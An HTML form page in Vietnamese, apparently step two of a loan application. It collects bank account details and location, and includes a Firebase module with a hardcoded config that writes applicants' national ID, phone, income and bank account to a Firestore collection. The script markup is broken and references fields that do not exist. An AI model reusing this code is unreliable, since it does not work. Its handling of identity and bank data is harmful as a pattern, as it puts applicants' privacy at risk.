<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bước 2 - Nhận tiền</title>

<style>
body{
  font-family: Arial, sans-serif;
  background:#f2f2f2;
  margin:0;
}
.container{
  max-width:420px;
  margin:auto;
  padding:15px;
}
h2{text-align:center;}
input{
  width:100%;
  padding:12px;
  margin:6px 0;
  border-radius:8px;
  border:1px solid #ddd;
  font-size:16px;
}
button{
  width:100%;
  padding:14px;
  background:#ff4fa3;
  color:white;
  border:none;
  border-radius:10px;
  font-size:18px;
  margin-top:12px;
}
.section{
  background:white;
  padding:12px;
  border-radius:10px;
  margin-bottom:15px;
}
</style>
</head>

<body>
<div class="container">

<h2>Thông tin nhận tiền</h2>

<div class="section">
<input type="text" id="stk" placeholder="Số tài khoản">
<input type="text" id="bank" placeholder="Ngân hàng">
<input type="text" id="owner" placeholder="Chủ tài khoản">
</div>

<h2>Khu vực nhận tiền</h2>

<div class="section">
<input type="text" id="province2" placeholder="Tỉnh / Thành phố">
<input type="text" id="district2" placeholder="Quận / Huyện">
<input type="text" id="ward2" placeholder="Phường / Xã">
</div>

<button onclick="submitForm()">Gửi hồ sơ vay</button>

</div>

<script>
function submitForm(){
  const step1 = JSON.parse(localStorage.getItem("step1") || "{}");

  const step2 = {
    stk: stk.value,
    bank: bank.value,
    owner: owner.value,
    province2: province2.value,
    district2: district2.value,
    ward2: ward2.value
  };

  const fullData = {...step1, ...step2};

  console.log(fullData); // để sau gửi Firebase

  alert("Gửi hồ sơ thành công!");
  localStorage.clear();
  window.location.href = "home.html";
}
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAMVMlleglI5teSX_wnH74MByezCeJAqqU",
  authDomain: "tambeo-b465a.firebaseapp.com",
  projectId: "tambeo-b465a",
  storageBucket: "tambeo-b465a.firebasestorage.app",
  messagingSenderId: "756559820351",
  appId: "1:756559820351:web:a30b3d8f9596ad5c1baa8a"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

window.guiHoSo = async function(){

  const data = {
    hoTen: document.getElementById("hoten").value,
    sdt: document.getElementById("sdt").value,
    cccd: document.getElementById("cccd").value,
    diaChi: document.getElementById("diachi").value,
    congViec: document.getElementById("congviec").value,
    thuNhap: document.getElementById("thunhap").value,
    soTaiKhoan: document.getElementById("stk").value,
    nganHang: document.getElementById("nganhang").value,
    soTienVay: localStorage.getItem("loanAmount"),
    congTy: localStorage.getItem("loanCompany"),
    thoiGian: new Date().toLocaleString()
  };

  await addDoc(collection(db, "hosovay"), data);
  alert("Đã gửi hồ sơ cho admin!");
}
</script>

</body>
</html>
